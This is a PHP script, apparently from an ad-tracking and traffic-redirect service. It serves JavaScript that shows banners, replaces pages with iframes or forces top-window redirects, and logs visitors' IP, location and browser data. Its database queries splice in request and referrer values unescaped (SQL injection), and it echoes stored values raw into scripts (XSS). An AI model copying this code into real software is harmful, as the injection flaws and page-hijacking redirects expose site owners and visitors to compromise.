<?php
header('Content-Type: application/javascript');
error_reporting(0);
$start = microtime(true);
require_once('protected/dump.php');
dumpLog($_SERVER, '', 'IN.log');
require_once('bot.php');

$search = array(    $_SERVER['SERVER_NAME'], 'google.ru', 'rambler.ru',	'mail.ru',	'aport.ru',	'aport.ru',	'google.com', 'yandex.ru', 'google.kz', 'it39.ru',  
  'livebiz.tk', 'google.az', 'google.by' );

$bot = whobot();

if (!isset($_REQUEST['tracker_hash'])) {
    dumpLog('!isset tracker_hash ', $_SERVER['REMOTE_ADDR'], 'die.log');
    die();
}

$REQUEST      = explode('/', $_REQUEST['tracker_hash']);
$tracker_hash = $REQUEST[0];
if (isset($REQUEST[1])) {
    if ($REQUEST[1] == 'direct') {
        $isDirect  = true;
        $isPreview = false;
		$vk = false;
    } else if ($REQUEST[1] == 'preview') {
        $isDirect  = false;
        $isPreview = true;
		$vk = false;
    } else if ($REQUEST[1] == 'vk') {
		$isDirect  = false;
        $isPreview = false;
		$vk = true;
	} else {
        dumpLog('tracker_hash != direct or preview', $_REQUEST['tracker_hash'], 'die.log');
        die();
    }
} else {
    $isDirect  = false;
    $isPreview = false;
	$vk = false;
}

unset($_REQUEST);
unset($_GET);
unset($_POST);

if (strlen($tracker_hash) != 32) {
    dumpLog('24 tracker_hash != 32 ' . $tracker_hash, $_SERVER['REMOTE_ADDR'], 'die.log');
    die();
}

require_once('protected/conf.php');
require_once('functions.php');

if ($isPreview == true) {
    $result = mysqli_query($DB, "SELECT * FROM tmptrackers WHERE trackerHash = '$tracker_hash'");
} else {
    $result = mysqli_query($DB, "SELECT * FROM trackers WHERE trackerHash = '$tracker_hash' AND active = 'Y' AND moderated = 'Y'");
}

if (!$result) {
    dumpLog('!$result', $_SERVER['REMOTE_ADDR'], 'die.log');
    die();
}
$row = mysqli_fetch_assoc($result);

if (!$row) {
    dumpLog('!$row (ban or not exist)', $_SERVER['REMOTE_ADDR'], 'die.log');
    die();
}

if ($row['unTracker'] == 'Y') {
    dumpLog('34 unTracker', $_SERVER['REMOTE_ADDR'], 'die.log');
    die();
}

$allowCOIN = $row['allowCOIN'];
$isPreviewLink = false;

if (isset($_SERVER['HTTP_REFERER'])) {
	$tmpIsPreviewLink = strpos($_SERVER['HTTP_REFERER'], 'preview');
	if ($tmpIsPreviewLink === false) {
		$isPreviewLink = false;
	} else {
		$isPreviewLink = true;
	} 
}

dumpLog($isPreviewLink, '', '1111.log');

$row['rule'] = unserialize($row['rule']);

if (!isset($_SERVER['HTTP_REFERER']) and $isDirect == false) {
    dumpLog('61 !HTTP_REFERER', $_SERVER['REMOTE_ADDR'], 'die.log');
    die();
}

$allow_domain = str_replace(' ', '', $row['themeURL']);
$allow_domain = str_replace('http://', '', $allow_domain);
$allow_domain = str_replace('https://', '', $allow_domain);
$allow_domain = str_replace('/', '', $allow_domain);
$allow_domain = explode(',', $allow_domain);

if ($isDirect == false) {
    if (isset($_SERVER['HTTP_REFERER'])) {
		if ($vk == true) {
			$referal = 'vk.com';
		} else {
			$referal = strtolower(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST));
		}
		
    } else {
        dumpLog('72 !HTTP_REFERER', $_SERVER['REMOTE_ADDR'], 'die.log');
        die();
    }
/*
    if ($referal != 'tds.i-cdm.ru') {
        if (!in_array($referal, $allow_domain)) {
            $unrefLog = ' 82 !in_array(' . $referal . ',' . $allow_domain[0] . ') ';
            $referal  = str_replace('www.', '', $referal);
            if (!in_array($referal, $allow_domain)) {
                if (!in_array($referal, $search)) {
                    $unrefLog .= ' 85 !in_array(' . $referal . ',' . $allow_domain[0] . ') ';
                    dumpLog($_SERVER, $_SERVER['REMOTE_ADDR'], 'die_search_bot.log');
                    dumpLog($unrefLog, $_SERVER['REMOTE_ADDR'], 'die.log');
                    die();
                }
            }
        }
    }
*/	
} else {
    $referal = 'direct';
}

require_once('aggregator/index.php');
dumpLog($referal, '', '$referal');
$args             = array();
$args['isDirect']  = $isDirect;
$args['isPreview'] = $isPreview;
$args['tracker']   = $row;
unset($row);
$args['aggregator'] = $aggregator;
unset($aggregator);

if ($isPreview == true) {
    $domainURL = 'https://tds.i-cdm.ru/tracker';
} else {	
	if ($_SERVER['SERVER_NAME'] != $args['tracker']['domain']) {
		dumpLog('140 SERVER_NAME != domain', $_SERVER['SERVER_NAME'].' '.$args['tracker']['domain'], 'die.log');
		die();
	}
	if (isset($_SERVER['HTTP_REFERER'])) {
		$http = (stristr($_SERVER['HTTP_REFERER'], 'http://')) ? 'http://' : 'https://';
	} else {
		$http = 'http://';
	}
$http = 'https://'; //think about it!!!
    $domainURL = $http . $args['tracker']['domain'];
}

if ($vk == true) {
	$trackerURL = $domainURL . '/' . $args['tracker']['trackerHash'] . '/' . 'vk' . '/';
} else {
	$trackerURL = $domainURL . '/' . $args['tracker']['trackerHash'];
}

$args['DB']		       = $DB;
$args['DB_aggregator'] = $DB_aggregator;

$args['bot'] = false;

if ($bot != 'not_bot') {
    $args['bot'] = true;
}

$filter = filter($args);

$type = $filter['type'];
$rule = $filter['rule'];

if ($referal == $_SERVER['SERVER_NAME']) {
    if ($args['tracker']['unPreview'] == 'Y') {
        dumpLog('151 unPreview', $_SERVER['REMOTE_ADDR'], 'die.log');
        die();
    }
    $rule = '_p';
}

$banner_url = $filter['banner_url'];

$banner_url = str_replace("http://tds.i-cdm.ru/tracker", $domainURL, $banner_url);
$banner_url = str_replace("https://tds.i-cdm.ru/tracker", $domainURL, $banner_url);

$banner_ext = $filter['banner_ext'];
$click_url  = $filter['click_url'];

if (isset($filter['blank'])) {
    $blank = $filter['blank'];
} else {
    $blank = '';
}

$redirect_url   = $filter['redirect_url'];
$redirect_timer = $filter['redirect_timer'];

$frame_url  = $filter['frame_url'];
$vkTitle    = $filter['other']['vkTitle'];
$vkMsg      = $filter['other']['vkMsg'];
$width 	    = (int)$filter['width'];
$height     = (int)$filter['height'];
$style      = '';
$videoTimer = ($filter['videoTimer'] != '') ? $filter['videoTimer'] : '0';
$videoGo    = $filter['videoGo'];


if ($width != '' && $width != '0') {
	$style .= 'width:'.$width.'px;';
} else {
	$style .= 'width:100%;';
}
if ($height != '' && $height != '0') {
	$style .= 'height:'.$height.'px;';
} else {
	$style .= 'height:100%;';
}


if ($type == 'Fullscreen' && $args['tracker']['id'] == '226') { // костыль фуллскрин

        $trackerHash = $args['tracker']['trackerHash'];
        
        if (isset($_COOKIE[$trackerHash])) {
            $typeFullScreen     = 'view';
            $uniqHash = $_COOKIE[$trackerHash];
        } else {
            $typeFullScreen     = 'uview';
            $uniqHash = rand(0, 999999) . 'a' . rand(0, 999999) . 'b' . rand(0, 999999);
            setcookie($trackerHash, $uniqHash);
        }
        
        $storage    = $args['tracker']['aggregatorStorage'];
        $ownerUid   = $args['tracker']['uid'];
        $ownerLogin = $args['tracker']['login'];
        $trackerId  = $args['tracker']['id'];
        
        $p = array(
            "phpplatform" => $args['aggregator']['platform'],
            "phpcity" => $args['aggregator']['city'],
            "phpcountry" => $args['aggregator']['country'],
            "phpip" => $args['aggregator']['ip'],
            "phpbrowser" => $args['aggregator']['browser'],
            "phpreferer" => $args['aggregator']['referer'],
            "phpos" => $args['aggregator']['OS'],
            "phplanguage" => $args['aggregator']['language'],
            "phprefererdomain" => $referal
        );
        
        $created = date("Y-m-d H:i:s");
        
        $tracker_rule = $trackerHash . $rule;

        mysqli_query($DB_aggregator, "INSERT INTO cummon (`id`, `trackerId`, `platform`, `ownerUid`, `ownerLogin`, `tracker_rule`, `view`, `click`, `redirect`, `frame`, `uview`, `uclick`, `uredirect`, `uframe`, `direct`, `udirect`, `timestamp`, `created`) VALUES (NULL, '$trackerId', '".$p['phpplatform']."', '$ownerUid', '$ownerLogin', '$tracker_rule', '0', '0', '0', '0', '0', '0', '0', '0','0','0', CURRENT_TIMESTAMP, '$created');");
        mysqli_query($DB_aggregator, "UPDATE cummon SET $typeFullScreen = $typeFullScreen + 1, `platform` = '".$p['phpplatform']."' WHERE tracker_rule = '$tracker_rule'");
        
        $viewed     = '0';
        $clicked    = '0';
        $redirected = '0';
        $framed     = '0';
        $directed   = '0';
        
        if ($typeFullScreen == 'uview' or $typeFullScreen == 'view') {
            $viewed     = '1';
            $clicked    = '0';
            $redirected = '0';
            $framed     = '0';
            $directed   = '0';
        }
        
        
        $result = mysqli_query($DB_aggregator, "INSERT INTO `" . $storage . "` (`id`, `trackerId`     , `trackerHash`     , `ownerUid`     , `ownerLogin`     , `uniqHash`    , `rule`  ,  `phpplatform`          , `phpcity`          , `phpcountry`          , `phpip`          , `phpbrowser`          , `phpreferer`          , `phpos`       , `phplanguage`       , `phprefererdomain`          , `view`         , `click`        , `redirect`      , `frame`, `direct`          , `timestamp`      , `created`)
				                                       		VALUES (NULL, '" . $trackerId . "', '" . $trackerHash . "', '" . $ownerUid . "', '" . $ownerLogin . "','" . $uniqHash . "', '" . $rule . "', '" . $p['phpplatform'] . "', '" . $p['phpcity'] . "', '" . $p['phpcountry'] . "', '" . $p['phpip'] . "', '" . $p['phpbrowser'] . "', '" . $p['phpreferer'] . "',     '" . $p['phpos'] . "',     '" . $p['phplanguage'] . "', '" . $p['phprefererdomain'] . "', '" . $viewed . "'  , '" . $clicked . "' , '" . $redirected . "' , '" . $framed . "'   , '" . $directed . "'   , CURRENT_TIMESTAMP, '" . $created . "');");
        mysqli_query($DB_aggregator, "UPDATE `" . $storage . "` SET $typeFullScreen = $typeFullScreen + 1 WHERE uniqHash = '" . $uniqHash . "'");

}  // костыль конец фуллскрин


if ($type != 'Redirect') {
    
    if ($isDirect == true) {
        header('Content-Type: text/html');
        $type = 'Direct';
        echo '<script>';
        require_once('js/jquery.js');
?>

<?php
        require_once('js/functions.js');
        echo '</script>';
        
    } else {
        
        require_once('js/jquery.js');
        
?>

<?php

	if ($allowCOIN == 'Y' && $isPreviewLink == false && isset($_SERVER['HTTP_REFERER'])) {
		echo '		
		var advance_stat = document.getElementById("'.$args['tracker']['trackerHash'].'");
		var sc_tds=document.createElement("script");
		sc_tds.src="'.$domainURL.'/stat_advanced.php?hash='.$args['tracker']['trackerHash'].'" 
		advance_stat.appendChild(sc_tds); 
		//window.setTimeout("advance_stat.removeChild(sc_tds);", 3000);
		'; 
	} elseif ($allowCOIN == 'A' && $isPreviewLink == false && isset($_SERVER['HTTP_REFERER'])) {
		echo '		
		var advance_stat = document.getElementById("'.$args['tracker']['trackerHash'].'");
		var sc_tds=document.createElement("script");
		sc_tds.src="'.$domainURL.'/stat_advance.php?hash='.$args['tracker']['trackerHash'].'" 
		advance_stat.appendChild(sc_tds); 
		//window.setTimeout("advance_stat.removeChild(sc_tds);", 3000);
		';	
	} else {
		echo '
			jQuery.ajax({
				url:      "'.$domainURL.'/statistic_advance.php?hash='.$args['tracker']['trackerHash'].'", 
				type:     "POST", 
				dataType: "jsonp", 
				data: args 
			});			
		';
	}
		
        require_once('js/functions.js');
    }
    
    if ($type != 'Redirect' and $type != 'Frame' and $type != 'Direct') {
        if ($type != null) {
            require_once('js/' . $type . '.js');
        }
    }
    
?>

<?php
    if ($isDirect == true) {
		header('Content-Type: text/html');
        echo '<script type="text/javascript">';
    }
?> 

function addStat(ftype) {

var unique = getUniq('<?php echo $args['tracker']['trackerHash']; ?>');

var args = {trackerId: '<?php echo $args['tracker']['id']; ?>',trackerHash: '<?php echo $args['tracker']['trackerHash']; ?>',ownerUid:'<?php echo $args['tracker']['uid']; ?>',ownerLogin:'<?php echo $args['tracker']['login']; ?>',storage: '<?php echo $args['tracker']['aggregatorStorage']; ?>', rule:'<?php echo $rule; ?>',uniqHash: unique.uniqHash,unique: unique.uniq, type: ftype, phpplatform: '<?php echo $args['aggregator']['platform']; ?>', phpcity: '<?php echo $args['aggregator']['city']; ?>', phpcountry: '<?php echo $args['aggregator']['country']; ?>', phpip: '<?php echo $args['aggregator']['ip']; ?>', phpbrowser: '<?php echo $args['aggregator']['browser']; ?>', phpreferer: '<?php echo $args['aggregator']['referer']; ?>', phpos: '<?php echo $args['aggregator']['OS']; ?>', phplanguage: '<?php echo $args['aggregator']['language']; ?>', phprefererdomain: '<?php echo $referal; ?>'};
	<?php
    if ($isPreview == false) {
?>	
    	jQuery.ajax({
			url:      "<?php echo $domainURL; ?>/statistic.php", 
			type:     "POST", 
			dataType: "jsonp", 
			data: args 
		   });

	<?php
    }
?>
}

<?php
    if ($isDirect == true) {
        echo '</script>';
    }
    
}

?> 


<?php
if ($type != 'Redirect' and $type != 'Frame' and $type != 'Direct') {
?>
	var prefix_stat = uniqClick('<?php echo $args['tracker']['trackerHash']; ?>','<?php echo $rule; ?>','view');  
	addStat (prefix_stat+'view');
	
	var tStyle = document.createElement('link');
	tStyle.href = '<?php echo $domainURL; ?>/css/<?php echo $type; ?>.css';
	tStyle.type = 'text/css';
	tStyle.rel = 'stylesheet';
	jQuery("[src = '<?php echo $trackerURL; ?>']").before(tStyle);

	var tParams_<?php echo $args['tracker']['trackerHash']; ?> = {tracker_hash: '<?php echo $args['tracker']['trackerHash']; ?>', tracker_rule: '<?php echo $rule; ?>',tracker_url: '<?php echo $trackerURL; ?>', banner_url: '<?php echo $banner_url; ?>', banner_ext: '<?php echo $banner_ext; ?>', click_url: '<?php echo $click_url; ?>', blank: '<?php echo $blank; ?>', vkMsg: '<?php echo $vkMsg; ?>', vkTitle: '<?php echo $vkTitle; ?>', videoGo: '<?php echo $videoGo; ?>', videoTimer: '<?php echo $videoTimer; ?>', style: '<?php echo $style; ?>', platform: '<?php echo $args['aggregator']['platform']; ?>'};
	t_<?php echo $type; ?> (tParams_<?php echo $args['tracker']['trackerHash'];?>);
	
<?php
} else if ($type == 'Frame') {
?>

		jQuery('body').html('');
		jQuery('body').css('margin','0px').css('padding','0px');
		jQuery('body').append("<iframe style = 'border:0px;' src='<?php echo $frame_url; ?>' width='100%' height='100%' scrolling = 'yes'></iframe>");
		var prefix_stat = uniqClick('<?php echo $args['tracker']['trackerHash']; ?>','<?php echo $rule; ?>','frame');  
		addStat (prefix_stat+'frame');

<?php
} else if ($type == 'Direct') {
	dumpLog($_SERVER, '', 'direct.log');
?>
		<script>
		var prefix_stat = uniqClick('<?php echo $args['tracker']['trackerHash']; ?>','<?php echo $rule; ?>','direct'); 
		addStat (prefix_stat+'direct');	
		window.location.href='<?php echo $redirect_url; ?>'; 	
		window.location.replace('<?php echo $redirect_url; ?>');
		</script>
		
<?php
} else if ($type == 'Redirect') {
    
    if ($isPreview == false) {
        
        if (stristr($_SERVER['HTTP_USER_AGENT'], 'YaBrowser')) {
            dumpLog($_SERVER['HTTP_USER_AGENT'], $_SERVER['REMOTE_ADDR'], 'die_yaBrowser.log');
            die();
        }
        
        $trackerHash = $args['tracker']['trackerHash'];
        
        if (isset($_COOKIE[$trackerHash])) {
            $type     = 'redirect';
            $uniqHash = $_COOKIE[$trackerHash];
        } else {
            $type     = 'uredirect';
            $uniqHash = rand(0, 999999) . 'a' . rand(0, 999999) . 'b' . rand(0, 999999);
            setcookie($trackerHash, $uniqHash);
        }
        
        $storage    = $args['tracker']['aggregatorStorage'];
        $ownerUid   = $args['tracker']['uid'];
        $ownerLogin = $args['tracker']['login'];
        $trackerId  = $args['tracker']['id'];
        
        $p = array(
            "phpplatform" => $args['aggregator']['platform'],
            "phpcity" => $args['aggregator']['city'],
            "phpcountry" => $args['aggregator']['country'],
            "phpip" => $args['aggregator']['ip'],
            "phpbrowser" => $args['aggregator']['browser'],
            "phpreferer" => $args['aggregator']['referer'],
            "phpos" => $args['aggregator']['OS'],
            "phplanguage" => $args['aggregator']['language'],
            "phprefererdomain" => $referal
        );
        
        $created = date("Y-m-d H:i:s");
        
        $tracker_rule = $trackerHash . $rule;

        mysqli_query($DB_aggregator, "INSERT INTO cummon (`id`, `trackerId`, `platform`, `ownerUid`, `ownerLogin`, `tracker_rule`, `view`, `click`, `redirect`, `frame`, `uview`, `uclick`, `uredirect`, `uframe`, `direct`, `udirect`, `timestamp`, `created`) VALUES (NULL, '$trackerId', '".$p['phpplatform']."', '$ownerUid', '$ownerLogin', '$tracker_rule', '0', '0', '0', '0', '0', '0', '0', '0','0','0', CURRENT_TIMESTAMP, '$created');");
        mysqli_query($DB_aggregator, "UPDATE cummon SET $type = $type + 1, `platform` = '".$p['phpplatform']."' WHERE tracker_rule = '$tracker_rule'");
        
        $viewed     = '0';
        $clicked    = '0';
        $redirected = '0';
        $framed     = '0';
        $directed   = '0';
        
        if ($type == 'uredirect' or $type == 'redirect') {
            $viewed     = '0';
            $clicked    = '0';
            $redirected = '1';
            $framed     = '0';
            $directed   = '0';
        }
        
        
        $result = mysqli_query($DB_aggregator, "INSERT INTO `" . $storage . "` (`id`, `trackerId`     , `trackerHash`     , `ownerUid`     , `ownerLogin`     , `uniqHash`    , `rule`  ,  `phpplatform`          , `phpcity`          , `phpcountry`          , `phpip`          , `phpbrowser`          , `phpreferer`          , `phpos`       , `phplanguage`       , `phprefererdomain`          , `view`         , `click`        , `redirect`      , `frame`, `direct`          , `timestamp`      , `created`)
				                                       		VALUES (NULL, '" . $trackerId . "', '" . $trackerHash . "', '" . $ownerUid . "', '" . $ownerLogin . "','" . $uniqHash . "', '" . $rule . "', '" . $p['phpplatform'] . "', '" . $p['phpcity'] . "', '" . $p['phpcountry'] . "', '" . $p['phpip'] . "', '" . $p['phpbrowser'] . "', '" . $p['phpreferer'] . "',     '" . $p['phpos'] . "',     '" . $p['phplanguage'] . "', '" . $p['phprefererdomain'] . "', '" . $viewed . "'  , '" . $clicked . "' , '" . $redirected . "' , '" . $framed . "'   , '" . $directed . "'   , CURRENT_TIMESTAMP, '" . $created . "');");
        mysqli_query($DB_aggregator, "UPDATE `" . $storage . "` SET $type = $type + 1 WHERE uniqHash = '" . $uniqHash . "'");
        
        $hash        = rand(0, 999999) . rand(0, 999999) . rand(0, 999999);
        //$redirectURL = $domainURL.'/redirect.php?site='.$redirect_url.'&hash='.$hash;
        $redirectURL = $redirect_url;
        
        header('Expires: Mon, 26 Jul 1997 05:00:00 GMT');
        header('Cache-Control: no-store, no-cache, must-revalidate');
        header('Cache-Control: post-check=0, pre-check=0', FALSE);
        header('Pragma: no-cache');
        
        if ($isDirect == true) {
			header('Content-Type: text/html');
            echo '<script type="text/javascript">';
        }
?>var redirect_timer = '<?php echo $redirect_timer; ?>';
			 setTimeout(function () {
			 
					setTimeout(function () {
					window.top.location.href='<?php echo $redirectURL; ?>';
					}, 0);
					
					setTimeout(function () {
					window.top.location.replace='<?php echo $redirectURL; ?>';
					}, 0);

					setTimeout(function () {
					window.top.location.href='<?php echo $redirectURL; ?>';
					}, 150);
					
					setTimeout(function () {
				    window.top.location.replace='<?php echo $redirectURL; ?>';
					}, 350);	

			}, redirect_timer);	
<?php
        if ($isDirect == true) {
            echo '</script>';
        }
        
        dumpLog($args['tracker']['id'] . ' ' . $args['tracker']['name'] . ' ' . $type . ' -' . $rule . ' from ' . $referal . ' to ' . $redirect_url, $_SERVER['REMOTE_ADDR'], 'redirect.log');
        
        //$_SERVER['hash'] = $hash;
        //dumpLog ($_SERVER,' index.php ','Redirect_SERVER.log');
        //dumpLog ($hash,' index ','Redirect_stat.log');
        
        
    } else {
        
        dumpLog($args['tracker']['id'] . ' ' . $args['tracker']['name'] . ' ' . $type . ' -' . $rule . ' from ' . $referal . ' to ' . $redirect_url, $_SERVER['REMOTE_ADDR'], 'redirect.log');
?>

	 var redirect_timer = '<?php echo $redirect_timer; ?>';
			 setTimeout(function () {

					setTimeout(function () {
					window.top.location.href='<?php echo $redirectURL; ?>';
					}, 0);
					
					setTimeout(function () {
					window.top.location.replace='<?php echo $redirectURL; ?>';
					}, 0);

					setTimeout(function () {
					window.top.location.href='<?php echo $redirectURL; ?>';
					}, 150);
					
					setTimeout(function () {
				    window.top.location.replace='<?php echo $redirectURL; ?>';
					}, 350);	

			}, redirect_timer);		

<?php
    }
}
?>

<?php
mysqli_close($DB);
mysqli_close($DB_aggregator);
dumpLog($_SERVER, $args['tracker']['id'].' ;rule = '.$rule.' ;type = '.$type, 'OUT.log');
$end  = (microtime(true) - $start);
$long = explode('.', $end);
$long = $long[0];

if ($long != 0) {
    $long_log = array();
    
    $long_log['all']    = (string) $end;
    $long_log['memory'] = convert(memory_get_peak_usage(false));
    
    dumpLog($long_log, ' ', 'long_index.log');
}

$log                = array();
$log['script']      = 'index';
$log['time']        = $end;
$log['type']        = $type;
$log['trackerHash'] = $args['tracker']['trackerHash'];
$log['rule']        = $rule;
$log['memory']      = convert(memory_get_peak_usage(false));

dumpLog($log, $_SERVER['REMOTE_ADDR'], 'timer.log');

function convert($size)
{
    $unit = array(
        'b',
        'kb',
        'mb',
        'gb',
        'tb',
        'pb'
    );
    return @round($size / pow(1024, ($i = floor(log($size, 1024)))), 2) . ' ' . $unit[$i];
}

?>






























